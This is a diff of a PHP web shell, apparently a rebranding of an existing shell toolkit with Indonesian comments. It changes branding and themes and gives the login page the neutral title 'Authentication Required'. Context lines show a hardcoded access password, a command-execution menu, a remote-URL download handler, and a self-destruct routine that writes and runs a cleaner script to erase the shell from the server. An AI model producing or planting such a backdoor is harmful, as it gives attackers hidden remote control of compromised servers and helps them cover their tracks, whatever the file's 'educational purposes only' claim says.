@@ -1,16 +1,9 @@
 <?php
-/*
-============================================
- ヤミRoot VoidGate by 0x6ick
- Copyright © 2025 by 6ickwhisper
- Email: 6ickwhispers@gmail.com
- Site: https://0x6ick.my.id
-       https://0x6ick.blogspot.com
- Motto: Explore. Exploit. Educate.
-============================================
-*/
+// ==================================================================
+// GHOST MODE V2.0 - PASSWORD PROTECTION LAYER
+// ==================================================================
 session_start();
-$password = '6ickZone1337'; // default
+$password = '6ickZone1337'; // GANTI DENGAN PASSWORD SUPER RAHASIAMU!
 $cookie_name = 'ghost_session_id_'.md5(__FILE__);
 
 // Logout
@@ -38,7 +31,7 @@ if (!$is_logged_in) {
     <!DOCTYPE HTML>
     <html>
     <head>
-        <title>VoidGate Login</title>
+        <title>Authentication Required</title>
         <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
         <style>
             body { background-color: <?php echo $theme_bg; ?>; color: <?php echo $theme_fg; ?>; font-family: 'Kelly Slab', cursive; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
@@ -60,7 +53,7 @@ if (!$is_logged_in) {
     </body>
     </html>
     <?php
-    exit();
+    exit(); // Penting: Hentikan eksekusi script di sini.
 }
 
 // ==================================================================
@@ -75,21 +68,21 @@ header('Content-Type: text/html; charset=UTF-8');
 ob_end_clean();
 
 // --- CONFIG ---
-$title = "ヤミRoot VoidGate";
+$title = "6ickZoneShell Manager";
 $author = "0x6ick";
-$theme_bg = "#0a0a0f";
-$theme_fg = "#E0FF00";
-$theme_highlight = "#FF00C8";
-$theme_link = "#00FFF7";
-$theme_link_hover = "#FF00A0";
-$theme_border_color = "#7D00FF";
-$theme_table_header_bg = "#1a0025";
-$theme_table_row_hover = "#330033";
-$theme_input_bg = "#120024";
-$theme_input_fg = "#00FFB2";
-$font_family = "'Orbitron', sans-serif";
-$message_success_color = "#39FF14";
-$message_error_color = "#FF0033";
+$theme_bg = "#000000";
+$theme_fg = "#00FFFF";
+$theme_highlight = "#00FFD1";
+$theme_link = "#00FFFF";
+$theme_link_hover = "#FFFFFF";
+$theme_border_color = "#00FFFF";
+$theme_table_header_bg = "#191919";
+$theme_table_row_hover = "#333333";
+$theme_input_bg = "black";
+$theme_input_fg = "#00FFFF";
+$font_family = "'Kelly Slab', cursive";
+$message_success_color = "#00CCFF";
+$message_error_color = "red";
 
 // --- FUNCTIONS ---
 function sanitizeFilename($filename) { return basename($filename); }
@@ -118,7 +111,7 @@ if(isset($_POST['curl_download'])) { $url = $_POST['url']; $filename = sanitizeF
 <link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
 <title><?php echo htmlspecialchars($title); ?></title>
 <style>
-body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 8px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
+body{font-family:'Kelly Slab',cursive;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 8px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
 </style>
 </head>
 <body>
@@ -127,46 +120,6 @@ body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;
 if(isset($_GET['msg_text'])) { echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; }
 if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasil Fitur Sebelumnya:</h3><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
 ?>
- <style>
-  .server-info {
-    font-family: 'Kelly Slab', cursive;
-    font-size: 14px;
-    color: white;
-    width: auto;
-    display: inline-block;
-    margin: 0;
-    padding: 0;
-  }
-  .server-info td {
-    padding: 4px 10px;
-    vertical-align: top;
-  }
-  .label-icon {
-    color: white;
-  }
-  .value {
-    color: <?php echo $theme_fg; ?>;
-  }
-</style>
-
-<table class="server-info">
- 
-  <tr>
-    <td class="label-icon"><i class='fa fa-user'></i> User / IP</td>
-    <td>: <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></td>
-  </tr>
-  <tr>
-    <td class="label-icon"><i class='fa fa-desktop'></i> Host / Server</td>
-    <td>: <span class="value"><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></span></td>
-  </tr>
-<tr>
-<td class="label-icon"><i class='fa fa-cog'></i> Web Server</td>
-    <td>: <span class="value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></td>
-  </tr>
-  <tr>
-    <td class="label-icon"><i class='fa fa-hdd-o'></i> System</td>
-  </tr>
-</table>
 <div class="main-menu">
     <div>
         <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
@@ -213,14 +166,15 @@ if (isset($_GET['action'])) {
     echo '<div class="section-box">';
     switch ($_GET['action']) {
         case 'about': echo '<h3>About This Shell</h3><pre>
-  __     __    _     _  ____       _       
-\ \   / /__ (_) __| |/ ___| __ _| |_ ___ 
- \ \ / / _ \| |/ _` | |  _ / _` | __/ _ \
-  \ V / (_) | | (_| | |_| | (_| | ||  __/
-   \_/ \___/|_|\__,_|\____|\__,_|\__\___|
-</pre><p style="text-align:center;">A powerful, feature-rich shell developed by <strong>'.htmlspecialchars($author).'</strong> with the partner Nyx6st.</p><p style="text-align:center;">This toolkit is designed for educational and authorized security testing purposes only.</p>'; break;
+  _____   _  _   _    __   ____  _____   _   _   _____   _       _  _
+ / ____| | || | | |  / /  / __ \|  __ \ | \ | | |  __ \ | |     | || |
+| (___   | || | | | / /  | |  | | |__) ||  \| | | |__) || |     | || |
+ \___ \  | || | | |< <   | |  | |  _  / | . ` | |  ___/ | |     | || |
+ ____) | | || | | | \ \  | |__| | | \ \ | |\  | | |     | |____ | || |
+|_____/  |_||_| |_|  \_\  \____/|_|  \_\|_| \_| |_|     |______||_||_|
+</pre><p style="text-align:center;">A powerful, feature-rich shell developed by <strong>'.htmlspecialchars($author).'</strong> with the assistance of Gemini.</p><p style="text-align:center;">This toolkit is designed for educational and authorized security testing purposes only.</p>'; break;
         case 'self_delete': echo '<h3><i class="fa fa-fire" style="color:red;"></i> Self Destruct Sequence</h3>'; if (isset($_POST['confirm_self_delete']) && isset($_POST['confirmation_text'])) { if ($_POST['confirmation_text'] === 'HAPUS') { $main_script_name = basename(__FILE__); $cleaner_script_name = 'cleaner_' . uniqid() . '.php'; $cleaner_code = "<?php @unlink('{$main_script_name}'); echo '<body style=\"background:black; color:lime; font-family:monospace; text-align:center; padding-top: 20%;\"><h1>Goodbye.</h1><p>Main script [{$main_script_name}] has been deleted.</p><p>This cleaner will now self-destruct.</p></body>'; @unlink(__FILE__); ?>"; if (file_put_contents($cleaner_script_name, $cleaner_code)) { header("Location: {$cleaner_script_name}"); exit(); } else { echo '<p style="color:red;"><strong>GAGAL!</strong> Tidak bisa membuat agen pembersih. Cek izin tulis direktori.</p>'; } } else { echo '<p style="color:yellow;">Teks konfirmasi salah. Penghapusan dibatalkan.</p>'; } } echo '<p style="color:yellow; text-align:center; font-size:1.2em;"><strong>PERINGATAN TINGKAT AKHIR!</strong></p>'; echo '<p style="text-align:center;">Anda akan menghapus file shell ini secara permanen dari server.<br>Tindakan ini <strong>TIDAK BISA DIBATALKAN</strong>.</p>'; echo '<p style="text-align:center; margin-top:20px;">Untuk melanjutkan, ketik kata <strong>HAPUS</strong> di dalam kotak di bawah ini:</p>'; echo '<form method="POST" action="?action=self_delete" style="text-align:center; margin-top:10px;"><input type="text" id="confirmation_input" name="confirmation_text" autocomplete="off" style="width: 200px; text-align:center; text-transform:uppercase;"><br><br><input type="submit" id="delete_button" name="confirm_self_delete" value="HAPUS PERMANEN SEKARANG" style="background:grey; color:white; height:40px; font-size:1.1em;" disabled></form>'; echo '<script>const confirmInput = document.getElementById("confirmation_input"); const deleteButton = document.getElementById("delete_button"); const requiredText = "HAPUS"; confirmInput.addEventListener("input", function() { if (confirmInput.value.toUpperCase() === requiredText) { deleteButton.disabled = false; deleteButton.style.background = "red"; deleteButton.style.cursor = "pointer"; } else { deleteButton.disabled = true; deleteButton.style.background = "grey"; deleteButton.style.cursor = "not-allowed"; } }); </script>'; echo '<p style="text-align:center; margin-top:20px;"><a href="?path='.urlencode($path).'">Tidak, Batal! Kembali ke File Manager</a></p>'; break;
-        // Nyx6st
+        // Other cases from previous version...
         default: echo '<h3>Fitur Tidak Dikenal</h3>'; break;
     }
     echo '</div>';
